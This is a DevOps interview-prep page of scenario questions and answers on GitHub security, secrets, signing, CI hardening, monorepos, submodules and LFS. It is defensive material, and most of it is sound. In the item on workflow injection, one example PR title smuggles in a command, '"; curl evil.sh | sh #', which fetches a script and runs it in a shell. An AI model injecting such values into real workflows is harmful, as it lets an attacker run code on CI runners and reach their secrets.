### Q153. A push is rejected: "GH013: Repository rule violations found ... Push cannot contain secrets". What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** GitHub push protection detected a known secret pattern in your commits.

**What I'd do →**
1. Read the message; it names the file and commit.
2. Remove the secret from the commit, not just the latest file state: amend or interactive rebase, so no commit in the push contains it.
3. Load the value from an environment variable or secret manager instead.
4. If it is a verified false positive or test token, use the bypass link and choose a reason; that is logged.

**Why →** Blocking before the push means the secret never reaches the remote, which beats cleaning afterwards.

**Interview tip →** Treat a real hit as a leak anyway if the secret was ever valid: rotate it.

</details>

### Q154. Secret scanning alerts have piled up, and many look like false positives or old test credentials. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Alert fatigue will cause real leaks to be ignored.

**What I'd do →**
1. Triage by validity: GitHub shows whether a provider-pattern secret is still active.
2. Rotate and close the valid ones as "revoked".
3. Close the rest as "false positive" or "used in tests" with a comment.
4. Exclude fixtures and paths via `secret_scanning.yml` (`paths-ignore`).
5. Track the time to remediation as a metric.

**Why →** Clean queues make real alerts stand out.

**Interview tip →** Validity checks let you prioritise active credentials first.

</details>

### Q155. You must set up signed commits on your laptop. Which method do you pick? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** GPG works but is heavier; SSH signing is simpler if you already use SSH.

**What I'd do →**
1. `git config --global gpg.format ssh`.
2. `git config --global user.signingkey ~/.ssh/id_ed25519.pub`.
3. `git config --global commit.gpgsign true` and `tag.gpgsign true`.
4. Add the public key to GitHub as a **Signing key**, separate from the authentication key.
5. Test: `git commit --allow-empty -m "test" && git log --show-signature -1`.

**Why →** SSH signing needs no extra tooling and works with hardware keys.

**Interview tip →** Local verification needs `gpg.ssh.allowedSignersFile`; GitHub verifies server-side.

</details>

### Q156. Your GPG signing key expires next week. What is the correct way to handle it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Expired keys lead to "Unverified" for new commits, though old commits stay verified.

**What I'd do →**
1. Extend expiry rather than creating a new key: `gpg --edit-key <KEYID>`, then `expire`, then `save`.
2. Export and upload the updated public key to GitHub.
3. If the key is compromised, revoke it and create a new one instead.
4. Document key rotation steps in the team wiki.

**Why →** Extending keeps the same identity and fingerprint, so downstream trust is untouched.

**Interview tip →** Know the difference between expiry (routine) and revocation (compromise).

</details>

### Q157. A release bot pushes commits, and branch rules require signed commits. How do you handle it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Bots have no personal key, so their commits show as unverified.

**What I'd do →**
1. Use the GitHub API (commits through a GitHub App token or `GITHUB_TOKEN`) so GitHub signs them with its own key and marks them Verified.
2. Or give the bot a dedicated signing key stored as a secret, uploaded to the bot account.
3. For file edits, use the contents API or GraphQL `createCommitOnBranch`, which produces verified commits.

**Why →** Commits created through the API by an app are signed by GitHub on its behalf.

**Interview tip →** Plain `git push` from a runner cannot produce verified commits without a key.

</details>

### Q158. You adopt a secret scanner on a ten-year-old repo and it reports 400 historical findings. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** You cannot block all work for historical issues, but you must stop new ones.

**What I'd do →**
1. Run a full-history scan once; rotate anything still valid.
2. Create a baseline so only new findings fail: `gitleaks detect --baseline-path gitleaks-baseline.json`.
3. Enable the scanner in pre-commit and as a required CI check.
4. Burn down the baseline over time.

**Why →** The baseline separates "known history" from "new risk", which keeps the gate usable.

**Interview tip →** Rotation matters more than whether history is rewritten.

</details>

### Q159. Your GitHub Actions workflows deploy to AWS using stored access keys. How do you improve that? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Long-lived keys in secrets can leak and rarely get rotated.

**What I'd do →**
1. Create an IAM OIDC identity provider for `token.actions.githubusercontent.com`.
2. Create a role whose trust policy restricts `sub` to `repo:ORG/REPO:environment:production` (or a branch/tag).
3. Use short-lived credentials in the workflow:

```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
      aws-region: ap-south-1
```

4. Delete the old access keys.

**Why →** Credentials last minutes and are bound to a specific repo and ref.

**Interview tip →** A loose `sub` condition (such as `repo:ORG/*`) is the classic misconfiguration.

</details>

### Q160. Your workflows use many third-party actions referenced by tag such as `@v3`. Is that a risk? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Tags can be moved, so a compromised action can change what you run, as happened with `tj-actions/changed-files` in 2025.

**What I'd do →**
1. Pin to a full commit SHA with the version in a comment: `uses: actions/checkout@<40-char-sha> # v4.2.2`.
2. Let Dependabot update pinned SHAs for `github-actions`.
3. Restrict allowed actions at org level (GitHub-owned and verified creators, or an allow-list).
4. Give workflows least-privilege `permissions`.

**Why →** A SHA is immutable, so the code you reviewed is the code that runs.

**Interview tip →** Mention both pinning and an allow-list.

</details>

### Q161. A workflow can write to the repo by default. How do you limit the damage of a compromised job? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The `GITHUB_TOKEN` may have broad rights depending on repository settings.

**What I'd do →**
1. Set the default workflow permission to read-only in repo or org settings.
2. Declare permissions per workflow or job:

```yaml
permissions:
  contents: read
jobs:
  release:
    permissions:
      contents: write
      id-token: write
```

3. Only the jobs that need write get it.

**Why →** A compromised step can then do only what its job was granted.

**Interview tip →** "Least privilege for the token" is a fast, high-value hardening.

</details>

### Q162. A developer's laptop was stolen, and it had a personal access token and SSH key for GitHub. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Assume an attacker can push, read private code and use the token.

**What I'd do →**
1. Revoke the PAT and remove the SSH and signing keys from the account (Settings → SSH and GPG keys).
2. Check the account's security log and org audit log for activity since the theft.
3. Rotate secrets the developer had access to; review recent pushes, new deploy keys, webhooks and Actions changes.
4. Enforce SSO, short-lived credentials and hardware-backed keys going forward.

**Why →** Access is tied to credentials, not to the person's laptop.

**Interview tip →** Fine-grained PATs with expiry reduce the blast radius.

</details>

### Q163. A private repository was made public by mistake for two hours. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Assume it was cloned and scanned.

**What I'd do →**
1. Make it private again immediately. Forks created while public stay public; delete them if possible through GitHub Support.
2. Scan full history for secrets and rotate anything found.
3. Check the audit log to see who changed visibility and why.
4. Restrict the "change visibility" permission to org owners.

**Why →** Visibility changes are reversible, but exposure is not.

**Interview tip →** Org setting "Repository visibility change" prevents members from doing it.

</details>

### Q164. An engineer left the company today. What do you do on the Git side? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Access must be removed quickly and completely.

**What I'd do →**
1. Remove from the GitHub organisation, or disable via SSO or SCIM deprovisioning.
2. Check for personal tokens, deploy keys and apps they authorised (org settings list these).
3. Reassign their open PRs and CODEOWNERS entries to a team.
4. Rotate shared secrets they knew.

**Why →** Central identity (SSO) makes this a single step instead of a checklist hunt.

**Interview tip →** Teams as code owners avoid orphaned review rules.

</details>

### Q165. Which credential type do you use for automation: classic PAT, fine-grained PAT, or a GitHub App? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The credential should be scoped, short-lived and not tied to one person.

**What I'd do →**
1. Prefer a GitHub App: repo-scoped permissions, short-lived installation tokens, not tied to a user's seat.
2. Use `GITHUB_TOKEN` when the work stays inside one repo.
3. A fine-grained PAT is acceptable for personal scripts, with expiry and selected repos.
4. Avoid classic PATs; they are broad and long-lived.

**Why →** Narrow scope and short life mean less damage if leaked.

**Interview tip →** "Not tied to a person" is the key org-level argument for Apps.

</details>

### Q166. A CI server needs read access to one private repo. Deploy key or machine user? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Pick the narrowest credential that fits.

**What I'd do →**
1. Deploy key: an SSH key tied to a single repo, read-only by default. Best for one repo.
2. Machine user: a separate account that can access many repos but consumes a seat and is a standing target.
3. For many repos, prefer a GitHub App with an installation token.
4. Rotate keys regularly and store them in the CI secret store.

**Why →** A deploy key cannot touch other repos, which limits damage.

**Interview tip →** A deploy key can only be used on one repository at a time.

</details>

### Q167. How do you catch vulnerable or malicious dependencies before they reach `main`? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Dependency changes should be reviewed like code.

**What I'd do →**
1. Enable Dependabot alerts and security updates.
2. Add the Dependency Review action on PRs to fail on new vulnerable packages or disallowed licenses.
3. Commit lockfiles and install with `npm ci` or equivalent.
4. Add CodeQL or another SAST scan as a required check.

**Why →** Catching it in the PR is much cheaper than after release.

**Interview tip →** Lockfiles plus review of dependency diffs address both bad versions and typosquats.

</details>

### Q168. A workflow echoes the PR title in a shell step, and a security reviewer flags it. Why? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** `${{ github.event.pull_request.title }}` is expanded into the script before the shell runs, so a crafted title can inject commands.

**What I'd do →**
1. Never interpolate untrusted fields (title, body, branch name, commit message) directly in `run:`.
2. Pass them through environment variables:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

3. Run zizmor or CodeQL's Actions queries to find such patterns.
4. Keep `GITHUB_TOKEN` permissions minimal.

**Why →** An env var is data to the shell, whereas inline expansion is code.

**Interview tip →** A title like `"; curl evil.sh | sh #` is a good concrete example.

</details>

### Q169. Before deploying, you want to confirm a release tag and commit were really created by your maintainers. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Signed tags and commits can be verified.

**What I'd do →**
1. `git verify-tag v2.5.0` and `git verify-commit <sha>`.
2. `git log --show-signature -1 v2.5.0`.
3. Make sure the signer's key is trusted (allowed signers file for SSH, keyring for GPG).
4. Fail the pipeline if verification fails.

**Why →** A valid signature proves the key holder created it, not that the content is safe.

**Interview tip →** Signature plus branch protection plus review gives a real chain of trust.

</details>

### Q170. A teammate enables SSH agent forwarding to every host for convenience. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** A forwarded agent lets root on the remote host use your keys while you are connected.

**What I'd do →**
1. Disable the global setting: `ForwardAgent no` by default in `~/.ssh/config`.
2. For hops to a bastion, use `ProxyJump` instead: `ssh -J bastion app01`.
3. For Git on servers, use deploy keys or short-lived tokens, not personal keys.
4. Use hardware-backed keys that require touch for each use.

**Why →** ProxyJump gives the same convenience without exposing the agent.

**Interview tip →** Mention `ssh-add -c` (confirm on use) as a mitigation.

</details>

### Q171. Legal asks for personal data in old commits to be erased entirely. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** This is the same operation as a secret purge, with extra legal tracking.

**What I'd do →**
1. Identify exact files and strings with `git log -S'<value>' --all` and `git grep` across history.
2. Rewrite with `git filter-repo` (path or text replacement) on a mirror clone.
3. Force-push all refs, invalidate caches, delete forks and old clones, rebuild CI caches and artifacts.
4. Ask GitHub Support to remove cached references and PR refs; record each step for compliance.

**Why →** Anything pushed may be in forks, clones, CI logs and backups, so the process is wider than Git.

**Interview tip →** Prevention: never commit real personal data into test fixtures.

</details>

### Q172. You removed a secret from branches, but the old commit still opens through a PR link. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** GitHub retains `refs/pull/*` and cached commit views even after history is rewritten.

**What I'd do →**
1. Confirm the secret is rotated; that is the real fix.
2. Contact GitHub Support with the commit SHAs to remove cached views and PR refs, as the refs are read-only to you.
3. Check forks and ask owners to delete them.
4. Record the incident and stop reusing the old repo state.

**Why →** You cannot delete `refs/pull/*` yourself, so rotation is the dependable control.

**Interview tip →** If a secret was public for any time, treat it as burned regardless.

</details>

### Q173. Customers ask for proof that the binary you ship was built from your repository by your pipeline. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** They want build provenance, not just a checksum.

**What I'd do →**
1. Generate SLSA-style provenance with GitHub artifact attestations:

```yaml
permissions:
  id-token: write
  attestations: write
  contents: read
steps:
  - uses: actions/attest-build-provenance@v2
    with:
      subject-path: dist/app.tar.gz
```

2. Customers verify: `gh attestation verify dist/app.tar.gz --repo ORG/app`.
3. Publish an SBOM alongside the release.
4. Sign container images with cosign if you ship images.

**Why →** The attestation ties the artifact to the repo, commit and workflow that built it.

**Interview tip →** Mention SLSA levels and that hosted runners help meet them.

</details>

### Q174. New developers keep committing `.env`, IDE folders and OS junk files. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Good ignore rules prevent most accidents.

**What I'd do →**
1. Maintain a project `.gitignore` using a language template, with `.env*` except `.env.example`.
2. Keep personal junk in a global ignore: `git config --global core.excludesFile ~/.gitignore_global`.
3. Check why a file is ignored: `git check-ignore -v path`.
4. Add `.env` scanning to pre-commit.

**Why →** Project rules cover project artifacts; global rules cover your editor and OS.

**Interview tip →** `.gitignore` never affects files that are already tracked.

</details>

### Q175. Shared build agents run as one user, and developers worry about stored Git credentials. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Credentials cached on shared hosts can leak between jobs.

**What I'd do →**
1. Do not use `credential.helper store` (plain text). Use ephemeral tokens injected per job.
2. In GitHub Actions use `GITHUB_TOKEN` via `actions/checkout`, set `persist-credentials: false` if later steps do not need Git.
3. Use ephemeral or containerised runners that are destroyed after each job.
4. Clean `~/.git-credentials` and agent sockets if the host is reused.

**Why →** Per-job short-lived credentials leave nothing behind to steal.

**Interview tip →** Self-hosted runners on public repos are a serious risk; avoid them or isolate them.

</details>

## Scale, Submodules, LFS and GitHub Automation

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q176. A monorepo has 4 GB of history and developers only touch one service. How do you make their day-to-day faster? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Most developers do not need all files or all blobs locally.

**What I'd do →**
1. Partial clone: `git clone --filter=blob:none --sparse URL`.
2. Limit the working tree: `git sparse-checkout set services/billing libs/common`.
3. Enable `core.fsmonitor` and `feature.manyFiles` for faster status.
4. Run `git maintenance start` for background prefetch and commit-graph updates.

**Why →** Blobs download on demand, and only needed paths are checked out.

**Interview tip →** Know the difference: shallow limits history depth, partial clone limits object types.

</details>

### Q177. Designers commit PSD and video assets, and the repo keeps growing. How do you move them to Git LFS? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** New files can be tracked going forward, but history already holds the blobs.

**What I'd do →**
1. `git lfs install` and `git lfs track "*.psd" "*.mp4"`; commit `.gitattributes`.
2. Convert existing history on a mirror clone: `git lfs migrate import --include="*.psd,*.mp4" --everything`.
3. Force-push and have everyone re-clone.
4. Check: `git lfs ls-files` and `git lfs status`.

**Why →** Git stores small pointer files, and the real content lives on the LFS server.

**Interview tip →** `migrate import` rewrites history, so do it once and coordinate.

</details>

### Q178. Your GitHub LFS bandwidth quota is exhausted and CI pulls fail. What do you do? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Every CI checkout downloads LFS objects, which counts against bandwidth.

**What I'd do →**
1. Short term: buy a data pack or raise the budget to unblock builds.
2. Reduce downloads: do not fetch LFS in jobs that do not need it (`lfs: false` in `actions/checkout`); fetch selectively with `git lfs pull --include`.
3. Cache LFS objects between runs (`actions/cache` on `.git/lfs`).
4. Long term, consider moving big assets to object storage (S3) with versioned references, or a self-hosted LFS server.

**Why →** Most CI jobs, such as linting, never need the binaries.

**Interview tip →** Forks also draw bandwidth from the upstream owner's quota.

</details>

### Q179. A repository uses a submodule. How does a developer get the right version of it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The parent repo pins the submodule to an exact commit.

**What I'd do →**
1. Fresh clone: `git clone --recurse-submodules URL`.
2. Existing clone: `git submodule update --init --recursive`.
3. After pulling the parent, run `git submodule update` to match the pinned commit.
4. Set `git config submodule.recurse true` to automate it.

**Why →** The submodule shows as a pointer; nothing updates it unless you run the command.

**Interview tip →** A "modified: libs/shared (new commits)" status means your checkout differs from the pin.

</details>

### Q180. Submodules, subtree or a package manager for sharing code between repos? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** The choice depends on how often the shared code changes and who edits it.

**What I'd do →**
1. Prefer a package manager (npm, PyPI, Maven, Go modules) for libraries with versioned releases.
2. Use submodules when you need an exact commit of a non-packaged repo, and the team accepts the extra commands.
3. Use `git subtree` when you want the code inside the repo with plain clone behaviour.
4. Choose a monorepo if teams change both sides together constantly.

**Why →** Packages give semantic versions and caching; submodules give exact pins but poor ergonomics.

**Interview tip →** Acknowledge that submodules are a common source of onboarding pain.

</details>

### Q181. CI cannot clone a private submodule: authentication fails in `actions/checkout`. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** `GITHUB_TOKEN` is scoped to the current repository only.

**What I'd do →**
1. Use a deploy key, GitHub App token or fine-grained PAT with read access to the submodule repo.
2. In the workflow:

```yaml
- uses: actions/checkout@v4
  with:
    submodules: recursive
    token: ${{ secrets.SUBMODULE_READ_TOKEN }}
```

3. If `.gitmodules` uses SSH URLs, pass `ssh-key` instead.
4. Keep the token read-only and rotate it.

**Why →** The default token cannot see other private repositories.

**Interview tip →** Using HTTPS URLs in `.gitmodules` makes CI auth simpler.

</details>

### Q182. You must remove a submodule completely. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A submodule leaves traces in three places: index, `.gitmodules` and `.git/modules`.

**What I'd do →**
1. `git submodule deinit -f libs/shared`.
2. `git rm -f libs/shared` (also edits `.gitmodules`).
3. `rm -rf .git/modules/libs/shared`.
4. Commit the change.

**Why →** Skipping the last step leaves stale metadata that breaks re-adding it later.

**Interview tip →** Know that deleting only the directory is a classic mistake.

</details>

### Q183. A merge shows a conflict on a submodule path, not on files. What is it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Both branches moved the submodule pointer to different commits.

**What I'd do →**
1. `git diff` shows `Subproject commit` lines for each side.
2. Pick the correct commit, often the newer one, if one contains the other: `cd libs/shared && git log --oneline --graph A B`.
3. `git add libs/shared` after checking out the chosen commit, then continue the merge.
4. Test the parent project with that pointer.

**Why →** The parent only records a SHA, so the conflict is a choice between two SHAs.

**Interview tip →** If neither contains the other, merge inside the submodule first.

</details>

### Q184. A huge repo makes `git status` and `git log` slow. What do you tune? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Large trees and many packfiles slow down core commands.

**What I'd do →**
1. Enable background maintenance: `git maintenance start`.
2. Write the commit graph: `git commit-graph write --reachable --changed-paths`.
3. Turn on `core.fsmonitor=true` and `core.untrackedCache=true`; consider `feature.manyFiles=true`.
4. Repack and tune: `git repack -adf --depth=50 --window=250`; check with `git count-objects -vH`.
5. Diagnose hot spots with `GIT_TRACE2_PERF=1 git status`.

**Why →** Commit-graph and fsmonitor avoid walking everything each time.

**Interview tip →** Measure first with `GIT_TRACE2_PERF`, then tune.

</details>

### Q185. You want issues and PRs labelled automatically and stale ones closed. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Housekeeping should not rely on people remembering.

**What I'd do →**
1. Use `actions/labeler` with a `.github/labeler.yml` mapping paths to labels.
2. Use `actions/stale` on a schedule to warn and close inactive items.
3. Use issue forms and PR templates to collect the right data.
4. Add the workflows with minimal `permissions` (`issues: write`, `pull-requests: write`).

**Why →** Automation keeps the backlog usable with no human effort.

**Interview tip →** Exempt labels such as `security` and `pinned` from stale closing.

</details>

### Q186. Fifty repositories copy-paste the same CI workflow. How do you maintain it centrally? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Copies drift, and fixes need fifty PRs.

**What I'd do →**
1. Write a reusable workflow with `on: workflow_call` in a central repo.
2. Call it:

```yaml
jobs:
  ci:
    uses: acme/.github/.github/workflows/node-ci.yml@v2
    with:
      node-version: 22
    secrets: inherit
```

3. Version it with tags and pin callers to `@v2`.
4. Use organisation workflow templates for new repos.

**Why →** One place to patch, versioned like a library.

**Interview tip →** Know when a composite action fits better: it bundles steps, not whole jobs.

</details>

### Q187. You need to apply a change (a new `CODEOWNERS` file) to 80 repositories. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Do it with a script, and still go through PRs.

**What I'd do →**
1. List repos: `gh repo list ORG --limit 200 --json name -q '.[].name'`.
2. Per repo: clone shallowly, branch, add the file, push, and `gh pr create --fill`.
3. Review failures and track merges with `gh search prs --owner ORG --label bulk-change`.
4. For ongoing needs use org-level rulesets or required workflows instead of per-repo files.

**Why →** PRs keep the audit trail and let owners object.

**Interview tip →** Tools like Renovate, Sourcegraph batch changes, or `gh` scripts all fit.

</details>

### Q188. New repositories should start with standard files, protections and CI. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Consistent starting points reduce setup mistakes.

**What I'd do →**
1. Create a template repository with README, LICENSE, CI, `CODEOWNERS`, `.gitignore`.
2. Add an organisation `.github` repo for default issue and PR templates, `SECURITY.md` and `CODE_OF_CONDUCT.md`.
3. Apply org-level rulesets so every repo gets baseline protection.
4. Optionally automate repo creation with Terraform.

**Why →** Defaults inherited at creation are far more reliable than a checklist.

**Interview tip →** Template repositories are not forks; they start with clean history.

</details>

### Q189. Your workflows reference many actions, and nobody updates them. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Outdated actions miss security fixes and Node runtime updates.

**What I'd do →**
1. Add Dependabot for Actions:

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

2. Review the PRs; CI shows whether anything broke.
3. Combine with SHA pinning so Dependabot updates the hash.

**Why →** Small, regular bumps are safer than one huge upgrade after two years.

**Interview tip →** It works for Docker, npm, pip and Terraform too.

</details>

### Q190. A team is moving from SVN to Git with ten years of history. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** You need history conversion, author mapping, and a workflow change.

**What I'd do →**
1. Build an authors file mapping SVN usernames to name and email.
2. Convert: `git svn clone --stdlayout --authors-file=authors.txt URL repo`.
3. Convert SVN branches and tags to Git refs, check history, and clean up large files (consider LFS).
4. Freeze SVN, run a final sync, switch CI, and train the team on Git.

**Why →** A good author map and a clean cut-over avoid broken blame and lost traceability.

**Interview tip →** Rehearse the migration on a copy first; measure time and size.

</details>

### Q191. In a monorepo, CI runs only for changed paths, but required checks then never appear for some PRs. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Path-filtered workflows do not run when files outside the filter change, so required checks stay pending.

**What I'd do →**
1. Remove `paths:` filters from the workflow trigger and detect changes inside the job (for example `dorny/paths-filter`).
2. Skip heavy jobs with `if:` conditions; skipped jobs count as passed.
3. Add a single always-running gate job and make only that required.
4. Use a merge queue with the same checks.

**Why →** A job-level skip reports a status, but a workflow that never triggered reports none.

**Interview tip →** This exact problem appears in nearly every monorepo migration.

</details>

### Q192. You want a disaster-recovery copy of all your GitHub repositories. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Git data is easy to back up; GitHub metadata is not.

**What I'd do →**
1. Scheduled mirror: `git clone --mirror` then regular `git remote update --prune`, stored in object storage.
2. Export metadata (issues, PRs, wikis) via the API or the migrations API.
3. Back up Actions secrets configuration as code (Terraform), not values.
4. Test a restore regularly.

**Why →** A backup that has never been restored is a hope, not a backup.

**Interview tip →** Every developer clone is also a partial backup of code, but not of issues or PRs.

</details>

### Q193. A project is finished. How do you retire its repository properly? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Keep history, stop changes, and tell users.

**What I'd do →**
1. Update the README with a deprecation note and a pointer to the replacement.
2. Close or triage open issues and PRs.
3. Remove secrets, webhooks and deploy keys.
4. Archive the repo (Settings → Archive); it becomes read-only. Transfer ownership first if needed.

**Why →** Archived repos keep their history and links but cannot receive changes.

**Interview tip →** Unarchive is possible, so archiving is reversible.

</details>

### Q194. A repository has one million files and `git status` takes 30 seconds. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Git scans the tree for changes. You need to avoid full scans.

**What I'd do →**
1. `git config core.fsmonitor true` and `core.untrackedCache true` (built-in FSMonitor on macOS and Windows; Watchman on Linux).
2. `git update-index --index-version 4`, or `feature.manyFiles=true`, which also enables these.
3. Use sparse-checkout in cone mode and sparse index: `git sparse-checkout init --cone --sparse-index`.
4. Time with `GIT_TRACE2_PERF=1 git status`.

**Why →** FSMonitor reports changed paths so Git does not scan everything.

**Interview tip →** Microsoft built these features for the Windows repo, which is the usual example.

</details>

### Q195. Every PR should get its own preview environment, cleaned up automatically. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Environments must be created on open and destroyed on close.

**What I'd do →**
1. Trigger on `pull_request` with types `opened`, `synchronize`, `reopened` and `closed`.
2. Name resources with the PR number (`app-pr-482`) and deploy to a namespace or stack.
3. On `closed`, run a teardown job; also run a nightly sweeper for leftovers.
4. Post the preview URL as a PR comment and use a GitHub deployment for status.

**Why →** Reviewers test real behaviour, and cost stays bounded by cleanup.

**Interview tip →** Never give fork PRs access to deployment secrets.

</details>

### Q196. Developers push several times quickly, and Actions queues redundant runs. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Only the latest commit of a branch needs CI.

**What I'd do →**
1. Add concurrency to the workflow:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

2. Do not cancel on `main` or deploy jobs; use `cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}`.
3. Check runner usage afterwards.

**Why →** Cancelling stale runs saves minutes and cost.

**Interview tip →** Never cancel deploys mid-flight.

</details>

### Q197. A game studio edits Unity scenes and PSD files, and merges of binary files keep destroying work. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Binary files cannot be merged, so concurrent edits mean one person's work is lost.

**What I'd do →**
1. Track binaries with LFS and mark them lockable: `git lfs track "*.psd" --lockable`.
2. Artists lock before editing: `git lfs lock art/hero.psd`, and unlock when pushed.
3. Lockable files are read-only locally until locked, preventing accidents.
4. Set Unity to text-based YAML serialisation and use its smart merge tool for scenes.

**Why →** Locks turn a merge problem into a coordination problem, which is solvable.

**Interview tip →** `git lfs locks` shows who holds what.

</details>

### Q198. New hires lose days to environment setup. How can Git hosting help? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** The environment should be code in the repo.

**What I'd do →**
1. Add a `.devcontainer/devcontainer.json` with the toolchain and extensions.
2. Let new hires open a Codespace, or use the same file locally in VS Code.
3. Keep a `make setup` that installs hooks and dependencies.
4. Prebuild Codespaces to cut startup time.

**Why →** One definition gives everyone the same environment, so setup bugs vanish.

**Interview tip →** Devcontainers work outside Codespaces, so no lock-in.

</details>

### Q199. With 600 repos and 40 teams, nobody knows who owns what. How do you fix ownership at scale? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Ownership data scattered across READMEs goes stale.

**What I'd do →**
1. Define repository custom properties (`owner-team`, `tier`, `lifecycle`) at org level and require them.
2. Use org rulesets targeting repos by property, for example stricter rules for `tier=1`.
3. Sync GitHub teams from the identity provider (SSO and SCIM).
4. Use CODEOWNERS with teams, and run a quarterly report for repos lacking owners.

**Why →** Machine-readable ownership lets policy and alerts apply automatically.

**Interview tip →** Connect it to incident response: ownership answers "who gets paged".

</details>

### Q200. GitHub has an outage during a critical release. How do you keep shipping? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** A dependency on one SaaS is a single point of failure for deployments.

**What I'd do →**
1. Check the GitHub status page first, and tell the team to avoid retry storms.
2. If a mirror exists (a GitLab, Gitea or bare repo kept in sync), build from it; otherwise any developer clone has the commit and can push to the internal mirror.
3. Build artifacts from a known SHA and deploy through the CD tool, not through GitHub UI.
4. After the outage, reconcile: push mirror commits back and review any manual steps.

**Why →** Git is distributed; the outage only blocks collaboration features, and artifacts you already built are unaffected.

**Interview tip →** Describe the mirror and break-glass deploy path as something you rehearse in advance.

</details>

<!-- DEVOPS-SHACK:FOOTER -->
---

<div align="center">

### 🚀 Made with ❤️ by [DevOps Shack](https://www.youtube.com/@devopsshack)

**Learn DevOps, DevSecOps, Cloud and Kubernetes the practical way.**

[▶️ YouTube — DevOps Shack](https://www.youtube.com/@devopsshack) · [▶️ Hindi — @shackverse](https://www.youtube.com/@shackverse) · [🎓 devopsshack.com](https://devopsshack.com) · [📸 Instagram @devopsshack](https://www.instagram.com/devopsshack)

[🏠 Back to Home](../README.md) · [⭐ Star the original repo](https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack)

<sub>© DevOps Shack · Licensed CC BY-NC-SA 4.0 · If you found this copy anywhere other than <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">github.com/jaiswaladi246</a>, the original and latest version is maintained by DevOps Shack.</sub>

</div>
<!-- /DEVOPS-SHACK:FOOTER -->
